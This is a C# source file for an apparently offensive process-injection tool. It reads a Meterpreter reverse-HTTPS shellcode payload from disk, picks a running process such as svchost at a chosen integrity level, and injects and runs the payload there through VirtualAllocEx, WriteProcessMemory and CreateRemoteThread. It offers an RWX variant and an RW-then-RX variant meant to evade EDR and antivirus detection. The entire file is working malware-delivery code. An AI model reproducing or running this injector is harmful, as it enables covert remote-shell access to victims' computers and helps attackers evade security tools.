using System.Runtime.InteropServices;
using System.Diagnostics;

namespace AutomaticProcessInjection2
{
    internal class Program
    {
        /********** imported functions **********/

        // opens the access token associated with a process
        // requires PROCESS_QUERY_INFORMATION
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            uint dwDesiredAcess,
            bool bInheritHandle,
            uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,  // LPVOID == IntPtr
            uint dwSize,  // size_t == int
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out int lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,  // 0 for default
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,  // 0 to make thread run immediately after creation
            IntPtr lpThreadId);  // for IntPtr that accepts NULL, use IntPtr.Zero !

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TokenInformationClass TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength,
            out uint ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern IntPtr GetSidSubAuthority(
           IntPtr sid,
           UInt32 subAuthorityIndex);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

        /********** constants **********/

        // process constants
        public const int PROCESS_CREATE_THREAD = 0x0002;
        public const int PROCESS_QUERY_INFORMATION = 0x0400;
        public const int PROCESS_VM_OPERATION = 0x0008;
        public const int PROCESS_VM_WRITE = 0x0020;
        public const int PROCESS_VM_READ = 0x0010;

        // memory protection constants
        public const int MEM_COMMIT = 0x00001000;
        public const int MEM_RESERVE = 0x00002000;
        public const int PAGE_READWRITE = 0x04;
        public const int PAGE_EXECUTE_READ = 0x20;
        public const int PAGE_EXECUTE_READWRITE = 0x40;

        // token access rights constants
        // https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects
        //public static uint TOKEN_QUERY_SOURCE = 0x0010;  // https://grep.app/search?q=TOKEN_QUERY_SOURCE
        public const uint TOKEN_ALL_ACCESS = 0x000F01FF;  // https://grep.app/search?q=TOKEN_ALL_ACCESS%20%3D

        // security RID constants
        // ..._PLUS_RID => + 0x100, e.g. MEDIUM_PLUS, SYSTEM_PLUS, etc.
        // https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
        // https://stackoverflow.com/q/12774738
        public const uint SECURITY_MANDATORY_UNTRUSTED_RID = 0x00000000;
        public const uint SECURITY_MANDATORY_LOW_RID = 0x00001000;
        public const uint SECURITY_MANDATORY_MEDIUM_RID = 0x00002000;
        public const uint SECURITY_MANDATORY_HIGH_RID = 0x00003000;
        public const uint SECURITY_MANDATORY_SYSTEM_RID = 0x00004000;
        public const uint SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x00005000;

        /********** structs & enums **********/

        // this enum holds integers that specify VARIOUS TYPES OF INFORMATION
        // that can be queried by `GetTokenInformation`
        // we only need `25`, for the INTEGRITY LEVEL
        // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class
        // when used with `GetTokenInformation`, the buffer passed into it
        // receives a `TOKEN_MANDATORY_LABEL` structure that specifies the token's integrity level.
        public enum TokenInformationClass
        {
            TokenIntegrityLevel = 25
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label
        // contains a `SID_AND_ATTRIBUTES` structure that specifies the mandatory integrity level of the token.
        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        // this struct is the one contained by the `TOKEN_MANDATORY_LABEL` struct
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        /********** entry point **********/

        static void Main(string[] args)
        {
            AutoRpiTest();
        }

        private static void AutoRpiTest()
        {
            byte[] payload = File.ReadAllBytes(@"C:\Users\proha\OneDrive\Desktop\payloads\xor_windows_x64_meterpreter_slash_reverse_https_106_4443.bin");
            Process? processInjectedInto = AutoInjectShellcodeIntoUserProcess(
                payload:payload, 
                minIntegrityLevelRID:SECURITY_MANDATORY_MEDIUM_RID, 
                maxIntegrityLevelRID:SECURITY_MANDATORY_MEDIUM_RID,
                injectWithRWX:true);
            if (processInjectedInto != null)
            {
                Console.WriteLine($"\n\n{processInjectedInto.ProcessName} {processInjectedInto.Id} {processInjectedInto.Responding}\n\n");
            }
            else
            {
                Console.WriteLine("\n\nFailed to inject into a process!\n\n");
            }
        }

        /********** user functions **********/

        public static Process? AutoInjectShellcodeIntoUserProcess(
            byte[] payload,
            string? preferredProcessName = "svchost",  // do not add ".exe" to the end of the name!
            uint minIntegrityLevelRID = SECURITY_MANDATORY_LOW_RID,
            uint maxIntegrityLevelRID = SECURITY_MANDATORY_HIGH_RID,
            bool injectWithRWX = false)
        {
            Process? preferredProcess = null;
            // if there is a preference specified
            if(preferredProcessName != null)
            {
                // attempt to get the preferred process by name and verify if it is a candidate
                foreach (Process process in Process.GetProcessesByName(preferredProcessName))
                {
                    if (IsProcessInjectionCandidate(process, minIntegrityLevelRID, maxIntegrityLevelRID))
                    {
                        // if so, set it to the preferred process then break
                        preferredProcess = process;
                        break;
                    }
                }
            }
            // if the preferred process is not obtained
            if (preferredProcess == null)
            {
                // get a list of candidate processes
                List<Process> candidateProcesses = new List<Process>();
                foreach (Process process in Process.GetProcesses())
                {
                    if (IsProcessInjectionCandidate(process, minIntegrityLevelRID, maxIntegrityLevelRID))
                        candidateProcesses.Add(process);
                }
                // select a random candidate process to set as the preferred process
                if (candidateProcesses.Count > 0)
                    preferredProcess = candidateProcesses[(new Random()).Next(candidateProcesses.Count())];
            }
            if (preferredProcess != null)
            {
                // inject into the preferred process and return the process injected into
                try
                {
                    if (injectWithRWX)
                        InjectShellcodeIntoProcessRWX(payload, preferredProcess.Id);
                    else
                        InjectShellcodeIntoProcess(payload, preferredProcess.Id);
                    return preferredProcess;
                }
                catch (Exception e)  // failed to inject
                {
                    Console.WriteLine(e.ToString());
                }
            }
            // if all else fails, return null
            return null;
        }

        public static bool IsProcessInjectionCandidate(
            Process process, 
            uint minIntegrityLevelRID, 
            uint maxIntegrityLevelRID)
        {
            // if process is accessible, has not exited, is responding, is within the min & max integrity levels, it is a candidate
            try 
            {
                uint? processIntegrityLevelRID = GetProcessIntegrityLevelRID(process);
                if (!process.HasExited && process.Responding 
                    && (processIntegrityLevelRID >= minIntegrityLevelRID) 
                    && (processIntegrityLevelRID <= maxIntegrityLevelRID))
                {
                    return true;
                }
            }
            catch (Exception e) 
            { 
                Console.WriteLine(e.ToString());  // dbg
            }
            return false;
        }

        public static void InjectShellcodeIntoProcessRWX(byte[] payload, int processId)
        {
            /*
             * Assigns RWX mem from the getgo with VirtualAllocEx .
             * This will likely get caught by EDR's and AV's (?) !
             */

            IntPtr hTargetProc = OpenProcess(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                false,
                (uint)processId);

            IntPtr pTargetMemAddr = VirtualAllocEx(
                hTargetProc,
                IntPtr.Zero,
                (uint)payload.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            UIntPtr __numBytesWritten;
            WriteProcessMemory(
                hTargetProc,
                pTargetMemAddr,
                payload,
                (uint)payload.Length,
                out __numBytesWritten);

            CreateRemoteThread(
                hTargetProc,
                IntPtr.Zero,
                0,
                pTargetMemAddr,
                IntPtr.Zero,
                0,
                IntPtr.Zero);

            CloseHandle(hTargetProc);
        }

        public static void InjectShellcodeIntoProcess(byte[] payload, int processId)
        {
            /* 
             * Uses the RW-then-RX trick. 
             * Does NOT work for self-modifying (i.e. encoded) shellcode! 
             * ^ Just kills the proc injected into!
             */

            IntPtr hTargetProc = OpenProcess(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                false,
                (uint)processId);

            IntPtr pTargetMemAddr = VirtualAllocEx(
                hTargetProc,
                IntPtr.Zero,
                (uint)payload.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

            UIntPtr __numBytesWritten;
            WriteProcessMemory(
                hTargetProc,
                pTargetMemAddr,
                payload,
                (uint)payload.Length,
                out __numBytesWritten);

            int __oldProtect;
            VirtualProtectEx(
                hTargetProc,
                pTargetMemAddr,
                (uint)payload.Length,
                PAGE_EXECUTE_READ,
                out __oldProtect);

            CreateRemoteThread(
                hTargetProc,
                IntPtr.Zero,
                0,
                pTargetMemAddr,
                IntPtr.Zero,
                0,
                IntPtr.Zero);

            CloseHandle(hTargetProc);
        }

        public static uint? GetProcessIntegrityLevelRID(Process process)
        {
            IntPtr hToken;
            if (OpenProcessToken(process.Handle, TOKEN_ALL_ACCESS, out hToken))
            {
                uint tokenInformationLength;
                uint _;
                // call GetTokenInformation initially just to get the LENGTH of the buffer to hold the output
                bool gtiResult1 = GetTokenInformation(
                    hToken,
                    TokenInformationClass.TokenIntegrityLevel,
                    IntPtr.Zero,
                    0,
                    out tokenInformationLength);
                // create the buffer to hold the token information
                IntPtr tokenInformationBuffer = Marshal.AllocHGlobal((int)tokenInformationLength);
                // call GetTokenInformation for real this time, supplying the real buffer and the length of the output
                bool gtiResult2 = GetTokenInformation(
                    hToken,
                    TokenInformationClass.TokenIntegrityLevel,
                    tokenInformationBuffer,
                    tokenInformationLength,
                    out _);
                if (gtiResult2)
                {
                    // convert the contents of the buffer into a struct
                    TOKEN_MANDATORY_LABEL tokenLabel =
                        (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(
                            tokenInformationBuffer,
                            typeof(TOKEN_MANDATORY_LABEL));
                    // retrieve the security identifier (SID) pointer from the tokenLabel structure
                    IntPtr pSid = tokenLabel.Label.Sid;
                    // get the index of the LAST SUBAUTHORITY (subAuthorityCount - 1)
                    uint subAuthorityCount = (uint)Marshal.ReadByte(GetSidSubAuthorityCount(pSid));
                    IntPtr pLastSubAuthority = GetSidSubAuthority(pSid, subAuthorityCount - 1);
                    // if `GetSidSubAuthority` does not return undefined / IntPtr.Zero, we have the uint representing the subauthority!
                    if (pLastSubAuthority != IntPtr.Zero)
                    {
                        try
                        {
                            return (uint)Marshal.ReadInt32(pLastSubAuthority);
                        }
                        catch (Exception e)
                        {
                            return null;
                        }
                    }
                }
            }
            return null;
        }
    }
}
